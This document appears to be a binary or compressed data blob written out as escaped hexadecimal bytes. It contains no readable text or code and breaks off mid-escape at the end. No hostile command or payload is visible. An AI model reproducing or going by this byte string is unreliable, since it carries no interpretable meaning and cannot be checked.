A\x80\x02\x84\x0D\x0D\x1D\x1D\x1D\x04\x65\x30\x85\x16\x19\x19\x19\xB2\xB2\x1D\x76\x07\x93\x06\x06\x7A\x7A\x7A\x34\x34\x8A\x8A\x8A\x10\x10\x0A\x0A\x0A\x11\x11\x11\x56\x56\x10\x21\x0B\x82\x35\x35\x05\x04\xD3\x11\x85\x56\x56\x56\x35\x35\x35\x33\xC4\x2D\x82\x48\x48\x48\x05\x4A\x38\x84\x1C\x1C\x1C\xB3\xB3\x12\x4F\x4D\x96\x02\x02\x02\x1B\x1B\xAD\xAD\xAD\x03\x03\x03\x3F\x3F\x03\x03\x03\x08\x08\x55\x55\x55\x5D\x5D\x2E\xBC\x1E\x41\x40\x40\x01\x41\x8C\x80\x02\x86\x00\x00\x19\x19\x19\x11\x11\x06\x3F\x4E\x0F\x44\x2B\x08\x2A\x08\x93\x1B\x1B\x68\x68\x68\x7E\x7E\x7E\x47\x47\x29\x29\x29\x30\x30\x7C\x7C\x7C\x1C\x1C\x06\x61\x11\x81\x42\x42\x10\xDE\x00\x05\x73\x3E\x05\x40\x01\x82\x6E\x6E\x6E\x31\x90\x5B\x84\x14\x14\x26\x26\x26\x05\x7E\x0B\x84\xC3\xC3\xC3\xB9\xB9\x0A\x45\x25\x92\x02\x02\x02\x18\x18\x18\x8B\x8B\x3A\x3A\x3A\x1E\x1E\x36\x36\x36\x11\x11\x11\x04\x77\x18\x85\x05\x10\x10\x45\x45\x45\x40\x76\x35\x51\x41\x40\x40\x01\x08\x08\x00\x82\x4A\x4A\x4A\x04\x4B\x53\xB4\x6F\x0A\x0A\x0A\x15\x15\xBF\xBF\xBF\x76\x76\x0D\x0D\x0D\xA8\xA8\xA8\x5C\x5C\x1F\x1F\x1F\x57\x57\x21\x21\x21\x45\x45\x92\x92\x92\x13\x13\x13\x52\x52\xC6\xC6\xC6\x1C\x1C\x3B\x3B\x3B\x07\x07\x39\x39\x39\x3A\x3A\x3A\x0F\xB2\x0A\x84\x14\x14\x14\x9F\x9F\x05\x4F\x34\x85\x20\x20\x20\x2E\x2E\x2E\x1E\xF5\x40\x13\x22\x04\x9E\x7A\x7A\x25\x25\x25\xC1\xC1\x72\x72\x72\x07\x07\x07\xB8\xB8\x21\x21\x21\x47\x47\x90\x90\x90\x2E\x2E\x98\x98\x98\xA7\xA7\xA7\x05\x6D\x18\x8F\x01\x01\xDB\xDB\xDB\x8F\x8F\x8F\x1C\x1C\x56\x56\x56\x70\x70\x3C\x40\x6C\xEC\x40\x41\x40\x40\x01\x41\x54\x80\x02\x87\x31\x31\x31\x25\x25\x8E\x8E\x8E\x05\x72\x1D\x97\x2C\x2C\x2C\x33\x33\xEA\xEA\xEA\x6E\x6E\x6E\x23\x23\xA0\xA0\xA0\xE3\xE3\x6A\x6A\x6A\xF1\xF1\x08\x05\xE4\x31\x81\x04\x04\x05\x5C\x07\x87\x03\x03\x03\x39\x39\xD7\xD7\xD7\x12\x99\x1D\x84\x83\x83\x83\xA6\xA6\x05\x48\x00\x85\xAC\xAC\xAC\x78\x78\x78\x2E\x3D\x15\x87\x0E\x0E\x0E\x38\x38\xA2\xA2\xA2\x05\xF6\x2B\x82\xA2\xA2\xA2\x05\xD6\x42\x05\x17\x4B\x84\x07\x07\x03\x03\x03\x05\xDC\x27\x88\x7F\x7F\x7F\x43\x43\x40\x40\x40\x20\x04\x44\x55\x84\x24\x24\x24\x89\x89\x40\x81\x3B\x60\x41\x40\x40\x01\x8D\x06\x06\x06\x4A\x4A\xB6\xB6\xB6\x2B\x2B\x2B\x11\x11\x8E\x04\x04\x26\x05\x26\x01\x80\x01\x04\x0B\x3A\x04\xB8\x00\x04\x0F\x07\x94\x03\x03\x03\x7B\x7B\x7B\x36\x36\x22\x22\x22\x0F\x0F\x19\x19\x19\x97\x97\x53\x53\x53\x12\x4B\x00\x89\x32\x32\x32\x15\x15\x0C\x0C\x0C\x8F\x8F\x05\xC4\x46\x2F\x59\x03\x8A\x1B\x1B\x1B\x13\x13\xC2\xC2\xC2\xEC\xEC\xEE\x05\xB4\x34\x86\xDB\xDB\x16\x16\x16\x0A\x0A\x05\x40\x01\x94\x04\x04\x04\x39\x39\x39\x2F\x2F\x10\x10\x10\x52\x52\x13\x13\x13\x6C\x6C\x6C\x71\x71\x40\x77\xB3\x0D\x41\x40\x40\x01\x41\x4F\x80\x02\x05\xB5\x14\x82\x5D\x5D\x5D\x05\x8E\x14\x82\x2B\x2B\x2B\x04\xE5\x37\x04\xD1\x1A\x07\x29\x34\x05\x98\x23\x8C\x36\x36\x36\x25\x25\x25\xE9\xE9\x29\x29\x29\x47\x47\x1A\xCC\x4A\x8C\x27\x27\x27\xF2\xF2\xB9\xB9\xB9\x96\x96\x2E\x2E\x2E\x31\xDE\x00\x94\x1B\x1B\x1B\xA5\xA5\x69\x69\x69\xE5\xE5\xE0\xE0\xE0\x1D\x1D\x1D\x56\x56\x55\x55\x55\x05\x5A\x55\x94\x0C\x0C\x10\x10\x10\x19\x19\x19\x33\x33\x70\x70\x70\x24\x24\xDC\xDC\xDC\x32\x32\x32\x40\x69\xA6\x21\x41\x40\x40\x01\x27\x37\x17\xA3\x87\x87\x87\x9F\x9F\x08\x08\x08\x41\x41\x69\x69\x69\x72\x72\x72\x72\x72\x54\x54\x54\xA4\xA4\xC3\xC3\xC3\xA0\xA0\x84\x84\x84\x3C\x3C\x3C\x1B\x1B\x1F\x47\x4D\x8C\x75\x75\x75\x4B\x4B\x77\x77\x77\x87\x87\x31\x31\x31\x31\xBB\x17\x05\x80\x07\x90\x0C\x0C\x0C\x0B\x0B\x07\x07\x07\x1E\x1E\x1E\xB8\xB8\x33\x33\x33\x33\x04\x04\x00\x8C\x33\x33\x26\x26\x26\x38\x38\x38\x2E\x2E\x7A\x7A\x7A\x19\xF6\x30\x41\x40\x40\x01\x41\xBC\x80\x02\x08\x80\x0D\x91\x6D\x6D\x6D\x84\x84\xBD\xBD\xBD\x26\x26\x26\x26\x26\x49\x49\x49\x50\x50\x05\x28\x34\x82\x63\x63\x63\x29\x85\x0D\x84\x12\x12\x12\x14\x14\x34\x89\x1D\x80\x02\x04\x9D\x6B\x9C\xBA\xBA\xBA\x21\x21\x21\x21\x21\x8B\x8B\x8B\x3C\x3C\x59\x59\x59\x4C\x4C\x4C\x4C\x4C\x80\x80\xB7\xB7\xB7\x0D\x0D\x0D\x2E\x10\x0E\x41\x40\x40\x01\x41\xB2\x80\x02\x07\x07\x00\x85\x3E\x3E\x3E\x02\x02\x02\x0A\xB2\x41\x85\x18\x18\x76\x76\x76\x75\x26\x5D\x1F\x40\x43\x53\x22\x81\x06\x06\x15\x9D\x0B\x40\xAA\xCD\x71\x41\x40\x40\x01\x10\xA9\x30\x89\x2D\x2D\xDD\xDD\xDD\x38\x38\x38\x6D\x6D\x27\xFA\x06\x81\x63\x63\x05\x1E\x74\x86\x09\x14\x14\x0E\x0E\x0E\x0E\x04\x04\x00\x8E\x46\x46\x46\x4E\x4E\x4E\x4E\x4E\x1A\x1A\x4E\x4E\x4E\x12\x12\x12\x48\x00\x05\x14\x37\x0E\x15\x00\x88\x1A\x1A\x61\x61\x61\x4F\x4F\x4F\x4F\x04\x04\x00\x89\x4F\x4F\xB7\xB7\xB7\x18\x18\x18\x18\x18\x05\x76\x61\x83\x0D\x0D\x0D\x0D\x04\x04\x00\x05\x5D\x00\x08\x0A\x00\x40\x80\x8A\x11\x41\x40\x40\x01\x41\x53\x80\x02\x86\x83\x83\x8D\x8D\x8D\x0C\x0C\x06\x5F\x15\x81\xB3\xB3\x1D\xA4\x48\x9E\x12\x12\x5E\x5E\x5E\x44\x44\x74\x74\x74\x21\x21\x3A\x3A\x3A\x23\x23\x23\xE4\xE4\x24\x24\x24\x96\x96\x64\x64\x64\xBC\xBC\xBC\x05\x57\x07\x05\x05\x00\x9E\x2E\x2E\xB1\xB1\xB1\x7D\x7D\x7D\x68\x68\x7A\x7A\x7A\x76\x76\x3C\x3C\x3C\x50\x50\x77\x77\x77\x59\x59\x59\x1F\x1F\x14\x14\x14\x05\x79\x05\xB5\x4C\x4C\x4C\x98\x98\x15\x15\x15\x10\x10\x10\x10\x10\x10\x10\x20\x20\x20\x7C\x7C\x7C\x20\x20\x30\x30\x30\x33\x33\x15\x15\x15\x2A\x2A\x2A\x29\x29\x51\x51\x51\xF3\xF3\x26\x26\x26\x29\x29\x6B\x6B\x6B\x24\x24\x24\x73\x73\x40\x81\x4D\x15\x41\x40\x40\x01\x10\x54\x03\x91\x48\x48\x52\x52\x52\x05\x05\xC2\xC2\xC2\xB5\xB5\xB5\x28\x28\x97\x97\x97\x12\xA2\x00\xD7\x02\x02\x4D\x4D\x4D\x58\x58\x58\x21\x21\x15\x15\x15\x2C\x2C\x1C\x1C\x1C\x39\x39\x05\x05\x05\x05\x05\x05\x3D\x3D\x3D\x3D\x3D\x3B\x3B\x17\x17\x17\x08\x08\x08\x2C\x2C\x9B\x9B\x9B\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x30\x30\x30\x6B\x6B\x6B\x6B\x6B\x6C\x6C\x6C\x92\x92\x29\x29\x29\x2A\x2A\x15\x15\x15\xDE\xDE\xDE\x4A\x4A\x7A\x7A\x7A\x12\x12\x0D\x0D\x0D\x08\x08\x08\x05\x06\x31\x05\xEB\x6D\x05\xE1\x6D\x82\xB6\xB6\xB6\x05\xAC\x70\x07\x12\x00\x85\x0F\x7B\x7B\x22\x22\x22\x04\x35\x6A\x8A\x1D\x25\x25\x70\x70\x70\xAE\xAE\xAE\x59\x59\x40\x6F\x3B\x6A\x41\x40\x40\x01\x41\x5F\x80\x02\x94\x4F\x4F\x4F\x2D\x2D\x40\x40\x40\xF4\xF4\xEB\xEB\xEB\xEC\xEC\xEC\x7F\x7F\xA1\xA1\xA1\x0F\xAA\x23\x8D\x02\x02\x02\x7E\x7E\x2D\x2D\x2D\x66\x66\x66\x1D\x1D\x81\x04\xF9\x31\x82\x22\x22\x22\x07\xDB\x00\x82\x03\xD0\xD0\x05\xEE\x00\x87\x3F\x3F\x3F\x54\x54\x54\x0F\x0F\x05\x9E\x4A\x05\xC2\x1D\x05\x68\x4E\x80\x04\x05\x08\x00\x05\x9C\x17\x04\x66\x65\x8D\x0A\x2F\x2F\x2F\x24\x24\xB2\xB2\xB2\xE2\xE2\xED\xED\xED\x05\x4A\x48\x84\x1D\x1D\x1D\x16\x16\x05\x85\x01\x82\x08\x08\x08\x05\xCD\x17\x80\x16\x04\x2C\x74\x05\x0A\x00\x82\x0A\x08\x08\x08\x8B\x01\x84\x35\x35\x86\x86\x86\x0D\xF2\x0B\x12\x11\x0C\x24\x5D\x78\x41\x40\x40\x01\x40\x50\xBE\x03\x8C\x62\x62\x62\xA7\xA7\x39\x39\x39\xC1\xC1\xB5\xB5\xB5\x05\x91\x1D\x82\x2D\x2D\x2D\x12\xAD\x23\x95\x1B\x1B\x2E\x2E\x2E\x3A\x3A\x3A\x64\x64\x5F\x5F\x5F\x29\x29\x8A\x8A\x8A\x13\x13\x13\x13\x04\x04\x00\x8C\x79\x79\x7C\x7C\x7C\x9B\x9B\x60\x60\x60\x54\x54\x54\x05\xF5\x00\x86\x0A\x0A\x3B\x3B\x3B\x1D\x1D\x05\xAD\x6D\x04\x1F\x47\x04\x48\x01\x05\x07\x00\xA1\x36\x36\x36\x05\x05\x05\x26\x26\x74\x74\x74\x2D\x2D\xB0\xB0\xB0\x05\x05\x05\x1C\x1C\xA7\xA7\xA7\x2D\x2D\x2D\x2D\x2D\x24\x24\xCA\xCA\xCA\x05\x69\x7A\x94\xA1\xA1\xA1\x45\x45\x65\x65\x65\x34\x34\x34\x4A\x4A\x74\x74\x74\x89\x89\x1F\x1F\x1F\x21\xDD\x10\x85\x3C\x3C\x3C\x49\x49\x49\x24\x83\x51\x41\x40\x40\x01\x41\x8B\x80\x02\x8B\x18\x18\x23\x23\x23\x2C\x2C\x04\x04\x04\x60\x60\x05\x87\x4E\x83\x60\xB6\xB6\x2A\x04\x4F\x44\x24\xC1\x11\xBD\x53\x53\x53\x1A\x1A\x1A\x1A\x1A\x09\x09\x09\x80\x80\x6A\x6A\x6A\x2A\x2A\x2A\x48\x48\x91\x91\x91\x48\x48\x42\x42\x42\xAD\xAD\x29\x29\x29\x33\x33\x33\x13\x13\x30\x30\x30\x30\x30\x79\x79\x79\x37\x37\x37\x37\x37\xAB\xAB\xAB\xDF\xDF\x95\x95\x95\x2F\x2F\x05\x5C\x51\x99\x08\x24\x24\x7E\x7E\x7E\x83\x83\x18\x18\x18\x9E\x9E\x0D\x0D\x0D\x09\x09\x09\x46\x46\x09\x09\x09\x53\x53\x2F\xC0\x17\x05\x1E\x7F\x82\x2A\x2A\x2A\x31\x8E\x28\x41\x40\x40\x01\x41\x7B\x80\x02\x9B\x06\x06\x06\x48\x48\x13\x13\x13\x05\x05\x04\x04\x04\x54\x54\xE0\xE0\xE0\x60\x60\x60\xA4\xA4\x2F\x2F\x2F\x82\x82\x1F\x85\x1B\x10\x10\x00\x89\x1F\x1F\x0C\x0C\x0C\xE3\xE3\xE3\x27\x27\x0A\x5A\x05\x82\x0D\x0D\x0D\x05\x4A\x75\x81\x27\x27\x04\x04\x00\x08\x08\x00\x86\x27\x27\x0E\x0E\x77\x77\x77\x05\x40\x01\x84\x28\x28\x28\x34\x34\x40\x46\xC5\x54\x87\x5C\x5C\x24\x24\x24\x2C\x2C\x2C\x23\x48\x4B\x41\x40\x40\x01\x40\x49\x40\x01\x97\xD4\xD4\xD4\x45\x45\x43\x43\x43\x01\x01\x0B\x0B\x0B\x20\x20\x0C\x0C\x0C\x88\x88\x88\x69\x69\x05\x04\xA1\x6D\x2F\x2D\x30\x87\x90\x90\x17\x17\x17\x1C\x1C\x1C\x0D\xE7\x3A\x19\x2E\x00\x8F\x77\x77\x77\x43\x43\x04\x04\x04\x17\x17\x17\xBD\xBD\x1B\x1B\x1B\x40\x43\xCC\x00\x89\x1B\x1B\x51\x51\x51\x0A\x0A\x0A\x64\x64\x2F\xFA\x01\x41\x40\x40\x01\x41\x7B\x80\x02\x84\x57\x57\x57\x15\x15\x05\xA3\x0E\x92\xA3\xA3\xA3\x89\x89\x8C\x8C\x8C\x11\x11\x11\xEF\xEF\x04\x04\x04\x52\x52\xE1\x2E\x92\x4E\x05\x4C\x48\x82\x1C\x1C\x1C\x0C\x21\x5F\x1D\x8E\x78\x89\x43\x43\x05\x05\x05\x3B\x3B\x3B\x6B\x6B\x40\x46\xCA\x4A\x81\x4C\x4C\x05\xE5\x51\x82\x04\x8A\x8A\x22\x4B\x4B\x41\x40\x40\x01\x40\x48\x40\x01\x9E\x21\x21\x21\x1E\x1E\x07\x07\x07\xD0\xD0\x5F\x5F\x5F\x63\x63\x3C\x3C\x3C\x3D\x3D\x3D\x41\x41\x04\x04\x04\x55\x55\xAF\xAF\xAF\x2C\x98\x24\x87\x16\x16\x36\x36\x36\x0C\x0C\x0C\x26\x8C\x03\x8A\xE6\xE6\xE6\x2C\x2C\x07\x07\x07\x05\x05\x05\x04\xE7\x2A\x80\x97\x40\x43\xCC\x00\x81\x48\x48\x05\x8D\x47\x82\x17\x5F\x5F\x40\x6A\x80\x07\x41\x40\x40\x01\x41\x3D\x40\x01\x80\x14\x05\xC7\x37\x05\x97\x67\x82\x03\x03\xCE\x04\x0F\x75\x83\x83\x83\x83\x0C\x04\x86\x1B\x05\xE3\x7D\x82\x23\x23\x23\x29\xCB\x10\x8A\x5E\x5E\x5E\x07\x07\x81\x81\x81\x2C\x2C\x2C\x26\x7C\x04\x8F\x02\x02\x02\x70\x70\x88\x88\x88\x11\x11\x11\x0C\x0C\x65\x65\x65\x40\x40\xEB\x27\x05\xE8\x65\x87\x0F\x0F\x0F\x0A\x0A\x0A\x70\x70\x41\x40\x40\x01\x40\x67\x40\x01\x85\x76\x76\x76\x37\x37\x37\x05\xC5\x30\x81\x28\x28\x05\x8A\x26\x8F\x02\x02\x02\x6B\x6B\x6B\x2B\x2B\x07\x07\x07\x5B\x5B\xCB\xCB\xCB\x29\xDD\x60\x8A\x4C\x4C\x4C\x0B\x0B\x81\x81\x81\x0C\x0C\x0C\x29\x36\x0A\x84\x9D\x9D\xA2\xA2\xA2\x05\xB2\x2E\x82\x24\x24\x24\x40\x40\xB2\x09\x85\x02\x02\x02\x21\x21\x11\x05\x94\x31\x81\x20\x20\x40\x67\xB9\x2A\x41\x40\x40\x01\x41\x3E\x40\x01\x87\x02\x02\x42\x42\x42\x55\x55\x55\x05\x59\x17\x81\xCD\xCD\x08\x17\x00\x8E\x87\x87\x87\x03\x03\x6F\x6F\x6F\x28\x28\x37\x37\x37\x73\x73\x27\x8B\x00\x82\x47\x47\x47\x05\x73\x1B\x82\x55\x55\x55\x29\x74\x01\x81\x98\x98\x05\xA9\x1B\x85\x03\x2F\x2F\xDA\xDA\xDA\x40\x40\xD1\x1D\x85\x02\x02\x02\x94\x94\x0F\x05\x11\x49\x81\x19\x19\x40\x65\x1F\x1E\x41\x3D\x40\x01\x91\x63\x63\x63\x50\x50\xCB\xCB\xCB\x08\x08\x08\x03\x03\x0C\x0C\x0C\xB7\xB7\x0B\xE8\x56\x82\x0C\x0C\x2B\x04\xC3\x03\x87\x6A\x6A\x6A\x26\x26\x32\x32\x32\x24\x50\x00\x8A\x34\x34\x34\x0B\x0B\xBE\xBE\xBE\x13\x13\x13\x29\x40\x01\x82\x3A\x3A\x11\x05\x91\x41\x84\x1C\x1C\x26\x26\x26\x1A\xF2\x00\x89\x06\x06\x06\x06\x06\x06\x06\x14\x14\x14\x05\x6F\x2D\x17\xD1\x01\x88\x18\x18\x18\x1E\x1E\x03\x03\x03\x3B\x04\x87\x64\x40\x62\x5F\x24\x41\x40\x40\x01\x41\x40\x40\x01\x87\x1B\x1B\x1B\x38\x38\x85\x85\x85\x05\x9E\x1D\x80\x23\x04\xC0\x54\x05\x27\x55\x05\xB5\x77\x92\x27\x2D\x2D\xE0\xE0\xE0\x72\x72\x1D\x1D\x1D\x10\x10\x62\x62\x62\x4D\x4D\x4D\x21\x7D\x04\x82\x37\x37\x37\x05\x68\x44\x82\x15\x15\x15\x29\xBF\x19\x82\x49\x49\x0F\x05\x31\x24\x86\x1C\x1C\xCA\xCA\xCA\x4E\x4E\x0D\x33\x01\x9C\x0E\x0E\x0E\x83\x83\x31\x31\x31\x57\x57\x57\xAE\xAE\xDC\xDC\xDC\x35\x35\x84\x84\x84\x82\x82\x57\x57\x57\x4F\x4F\x4F\x14\x42\x01\x8A\x21\x21\x21\x36\x36\x07\x07\x07\x0C\x0C\x0C\x30\xE0\x78\x41\x40\x40\x01\x41\x74\x80\x02\x9F\x5E\x5E\x5E\x51\x51\x05\x05\x05\x03\x03\x03\x55\x55\x47\x47\x47\x5D\x5D\x2D\x2D\x2D\x2A\x2A\x30\x30\x30\x19\x19\x19\x2C\x2C\xC8\x04\xDC\x41\x88\xA2\xA2\xA2\x93\x93\xF5\xF5\xF5\x27\x0A\x52\x1B\x19\x12\x38\x8A\x43\x43\x43\x0F\x0F\x39\x39\x39\x24\x24\x24\x29\x92\x34\xBA\x3A\x3A\x41\x41\x41\x22\x22\x22\x43\x43\x45\x45\x45\x1A\x1A\x12\x12\x12\x7D\x7D\x4A\x4A\x4A\x96\x96\x96\x51\x51\x37\x37\x37\x19\x19\x19\x19\x19\x10\x10\x10\x25\x25\xF1\xF1\xF1\x1C\x1C\x5B\x5B\x5B\x19\x19\x23\x23\x23\x50\x50\x50\xA8\xA8\x12\x4D\x00\x8C\xC5\xC5\xC5\x11\x11\x1D\x1D\x1D\x15\x15\x15\x86\x86\x41\x40\x40\x01\x40\x62\x40\x01\x85\x50\x50\x50\x52\x52\x01\x05\x36\x1A\x8B\x52\x52\x37\x37\x37\x0A\x0A\xCC\xCC\xCC\x1D\x1D\x05\xD8\x79\x92\x07\x01\x01\xD8\xD8\xD8\xB5\xB5\xC8\xC8\xC8\xF4\xF4\x25\x25\x25\xD2\xD2\xD2\x21\x0E\x04\x8A\xC7\xC7\xC7\x0B\x0B\x08\x08\x08\xBC\xBC\xBC\x29\xFC\x06\x94\x34\x34\x54\x54\x54\x11\x11\x11\x16\x16\x26\x26\x26\x6D\x6D\x82\x82\x82\x20\x20\x39\x05\xD3\x2A\x05\x79\x24\x05\x31\x28\x05\x1B\x12\x06\x67\x0B\x04\x85\x4D\x85\x2D\x2D\x2D\x44\x44\x44\x14\xEC\x0D\x8A\x40\x40\x40\x36\x36\x17\x17\x17\x2D\x2D\x2D\x40\x64\xFB\x0E\x41\x40\x40\x01\x41\x3E\x40\x01\x8C\x5C\x5C\x34\x34\x34\x2F\x2F\x93\x93\x93\x60\x60\x60\x05\xF4\x16\x86\x1D\x1D\x01\x01\x01\xB0\xB0\x05\x68\x2B\x92\x07\x01\x01\x60\x60\x60\xCF\xCF\xCF\xCF\xCF\xA2\xA2\x05\x05\x05\x2E\x2E\x2E\x1F\x14\x01\x82\x77\x77\x05\x04\x20\x68\x85\x2F\x2F\x2F\x9D\x9D\x9D\x29\x40\x01\x05\x00\x05\x8C\x93\x93\x93\x11\x11\x3B\x3B\x3B\x19\x19\x25\x25\x25\x05\x3B\x28\x84\x07\x07\x07\xB0\xB0\x05\x18\x08\x06\xDF\x17\x91\x08\x08\x25\x25\x25\x25\x25\x1C\x1C\x1C\xE9\xE9\x3A\x3A\x3A\x76\x76\x76\x12\x76\x38\x84\x3E\x3E\x1C\x1C\x1C\x05\xC9\x00\x82\xF3\xF3\xF3\x21\x2F\x08\x41\x40\x40\x01\x40\x41\x40\x01\xAB\x7D\x7D\x19\x19\x19\x1D\x1D\x11\x11\x11\xD9\xD9\xD9\xB3\xB3\x49\x49\x49\xAE\xAE\x97\x97\x97\x8C\x8C\x2E\x2E\x2E\x21\x21\x21\x35\x35\x65\x65\x65\x01\x01\xA2\xA2\xA2\x41\x41\x0C\x05\xC8\x17\x1F\x94\x0D\x81\xAA\xAA\x05\x5C\x2A\x85\x6A\x6A\x6A\x8C\x8C\x8C\x29\x83\x3D\x81\xAD\xAD\x06\x5F\x7E\x04\x3D\x74\x8F\x19\x73\x73\xAF\xAF\xAF\x67\x67\x62\x62\x62\x90\x90\x90\x47\x47\x05\x89\x00\x88\x82\x82\x82\x47\x47\x47\x7E\x7E\x50\x04\xB7\x34\x87\xB1\xB1\xB1\x3C\x3C\x27\x27\x27\x15\x5C\x20\x81\x86\x86\x05\x4C\x08\x85\x08\x08\x08\xD3\xD3\xD3\x40\x62\xDC\x5D\x41\x40\x40\x01\x41\x40\x40\x01\x82\x42\x42\x1C\x04\xDA\x54\x85\x07\x07\x07\x67\x67\x67\x0C\xC5\x40\x06\x5E\x3A\x86\x02\x02\x09\x09\x09\x24\x24\x05\x1E\x61\x87\x1E\x1E\x1E\xDD\xDD\xDD\x95\x95\x1D\x48\x15\x04\x20\x61\x06\x3D\x15\x80\x73\x04\x72\x15\x2C\x80\x07\x05\x62\x7E\x82\xDE\xDE\xDE\x0F\xF6\x0D\x06\x1B\x3F\x21\x81\x74\x0A\x1A\x6E\x05\xC4\x4B\x85\x66\x66\x66\x34\x34\x34\x40\x62\x80\x07\x41\x3D\x40\x01\x84\x0E\x0E\x0E\x19\x19\x05\xEF\x02\x82\x1E\x1E\x1E\x1A\x2A\x13\x91\xB1\xB1\x0A\x0A\x0A\x0F\x0F\x43\x43\x43\x7C\x7C\x7C\x2A\x2A\x7D\x7D\x7D\x1A\xA2\x7A\x8C\x13\x13\x04\x04\x04\x04\x04\x13\x13\x13\x4C\x4C\x4C\x29\x89\x00\x8C\x26\x26\x69\x69\x69\x69\x69\x69\x03\x03\x6B\x6B\x6B\x3E\x40\x1A\x81\x91\x91\x05\xC1\x01\x85\x2C\x2C\x2C\x21\x21\x21\x41\x40\x40\x01\x41\x9C\x80\x02\x8C\x63\x63\x63\x70\x70\x70\x17\x17\x03\x03\x03\x9A\x9A\x1D\xCA\x67\x8E\x12\x12\x9F\x9F\x9F\x6F\x6F\x01\x01\x01\x2F\x2F\x2F\x19\x19\x1A\x59\x11\x82\xAF\xAF\xAF\x05\x4A\x2A\x81\x28\x28\x05\xB6\x34\x27\xE4\x5A\x8F\x1B\x1B\x1B\x25\x25\x88\x88\x88\x54\x54\x54\x05\x05\x23\x23\x23\x3B\x4F\x6B\x84\x02\x02\x02\x2A\x2A\x05\xE2\x34\x82\x10\x10\x10\x29\x9E\x68\x41\x40\x40\x01\x41\x76\x80\x02\x83\xC0\xC0\xC0\x1E\x04\xA8\x1A\x84\x05\x05\x05\x38\x38\x1F\x67\x1E\x84\x1B\x1B\x1B\x7C\x7C\x06\x13\x21\x84\x1E\x1E\xA6\xA6\xA6\x14\x23\x75\x80\x06\x05\xF5\x33\x05\x83\x1F\x84\x0C\x0C\x21\x21\x21\x29\xBA\x1E\x8D\x3C\x3C\x3C\x0A\x0A\x72\x72\x72\x2B\x2B\x2B\x2C\x2C\x67\x26\x74\x2E\x1A\xA8\x00\x81\x40\x40\x05\x0B\x2C\x82\x51\x51\x51\x40\x5F\x00\x3C\x41\x3E\x40\x01\x8C\x5A\x5A\xA1\xA1\xA1\x3B\x3B\x3B\x0F\x0F\x29\x29\x29\x24\x6A\x03\x81\x67\x67\x06\xA3\x6D\x84\x0C\x0C\x15\x15\x15\x04\x01\x61\x10\x34\x00\x06\x43\x28\x05\xC2\x40\x84\x79\x79\x57\x57\x57\x2C\x7B\x7A\x8C\x04\x04\x3F\x3F\x3F\x0B\x0B\x0B\x79\x79\x6D\x6D\x6D\x3D\x38\x2E\x87\x4C\x5B\x5B\x3D\x3D\x3D\x5B\x5B\x05\x6A\x5E\x40\x5B\x3B\x2E\x41\x40\x40\x01\x41\x40\x40\x01\x82\xB2\xB2\x1E\x05\x96\x64\x82\x0C\x0C\x44\x26\xA6\x31\x84\x09\x09\x6A\x6A\x6A\x05\x1F\x28\x87\x13\x13\x13\x15\x15\x38\x38\x38\x0F\x95\x34\x85\x32\x32\x32\xC3\xC3\xC3\x05\xBD\x0A\x81\xF5\xF5\x0D\xDF\x7B\x1F\x4E\x68\x8F\x51\x51\x51\x2B\x2B\xA4\xA4\xA4\x05\x05\x05\x2A\x2A\x58\x58\x58\x3B\xD6\x00\x82\x27\x27\x27\x04\x9C\x48\x86\x29\x5F\x5F\x71\x71\x71\x46\x40\x5C\xBE\x3A\x41\x3D\x40\x01\x8C\x09\x09\x09\x6E\x6E\x16\x16\x16\x1E\x1E\x1E\x2E\x2E\x27\xD8\x10\x05\x24\x28\x8F\x16\x16\x16\x17\x17\x25\x25\x25\x13\x13\x9F\x9F\x9F\x42\x42\x42\x0C\x20\x17\x85\xBA\xBA\xBA\x04\x04\x04\x05\x7A\x13\x81\x38\x38\x27\x6C\x24\x05\xD7\x6D\x82\x0C\x0C\x0C\x05\x39\x5E\x84\x0C\x0C\x0C\x49\x49\x3E\xF5\x00\x8C\x75\x75\x75\x67\x67\x71\x71\x71\x62\x62\xC0\xC0\xC0\x40\x5A\x3B\x24\x41\x40\x40\x01\x41\x3E\x40\x01\x8C\x3E\x3E\x7D\x7D\x7D\x15\x15\x15\x15\x15\x44\x44\x44\x2B\x64\x00\x85\x0D\x0D\x0D\x96\x96\x96\x05\x96\x1D\x87\x20\x20\x23\x23\x23\x67\x67\x67\x0C\x2D\x3E\x8C\x82\x82\x82\x39\x39\x39\x9A\x9A\x20\x20\x20\x35\x35\x2A\x37\x3A\x81\x44\x44\x05\xD9\x1D\x87\x08\x08\x08\x8A\x8A\x8A\x8B\x8B\x3B\xF0\x2D\x90\x06\x06\x06\x1B\x1B\x1B\xC4\xC4\x5E\x5E\x5E\x1B\x1B\x09\x09\x09\x3E\x40\x57\xBE\x44\x41\x3D\x40\x01\x8C\x0D\x0D\x0D\xC4\xC4\x24\x24\x24\x24\x24\x7D\x7D\x7D\x31\x62\x00\x8F\x86\x86\x86\x24\x24\x08\x08\x08\xAB\xAB\x35\x35\x35\x6D\x6D\x6D\x0C\xC0\x03\x8C\x95\x95\x95\x29\x29\x29\xA5\xA5\x8D\x8D\x8D\x73\x73\x2A\xF0\x0F\x81\xF2\xF2\x05\xA9\x67\x85\x0C\x0C\x0C\x8D\x8D\x8D\x29\xF6\x03\x14\x16\x02\x8A\x5E\x5E\x5E\xDF\xDF\xDF\x26\x26\x4A\x4A\x4A\x40\x5C\xBD\x71\x41\x40\x40\x01\x41\x3E\x40\x01\x87\x5C\x5C\x5C\x3A\x3A\x8B\x8B\x8B\x39\xDA\x20\x8C\x06\x06\x67\x67\x67\xCD\xCD\x57\x57\x57\x5C\x5C\x5C\x0C\x19\x00\x82\x68\x68\x68\x05\xB8\x6D\x84\x42\x42\x42\x83\x83\x27\x4D\x00\x92\x1A\x1A\x1A\x13\x13\x93\x93\x93\x07\x07\x10\x10\x10\xF0\xF0\xF0\x74\x74\x7E\x04\xE4\x1D\x80\x77\x04\xE4\x1D\x83\x7E\x7E\x7E\x48\x04\x7C\x47\x9C\x95\x95\x95\x8C\x8C\x47\x47\x47\x47\x47\x47\x42\x42\x42\x42\x42\x47\x47\x95\x95\x95\x42\x42\x77\x77\x77\x9E\x9E\x9E\x0A\xC7\x00\x8E\xE2\xE2\x71\x71\x71\x19\x19\x19\x60\x60\xAC\xAC\xAC\x58\x58\x40\x46\x08\x45\x41\x40\x40\x01\x17\x02\x01\x40\x43\x41\x0A\x82\x14\x14\x14\x0F\x2B\x07\x8A\x12\x12\x12\x61\x61\x61\x58\x58\x32\x32\x32\x29\x7D\x07\x8F\x4E\x4E\x4E\x1E\x1E\x0F\x0F\x0F\x3D\x3D\x40\x40\x40\x28\x28\x28\x05\xDA\x49\x8A\x99\x99\xA6\xA6\xA6\x99\x99\x99\x99\x99\x20\x04\x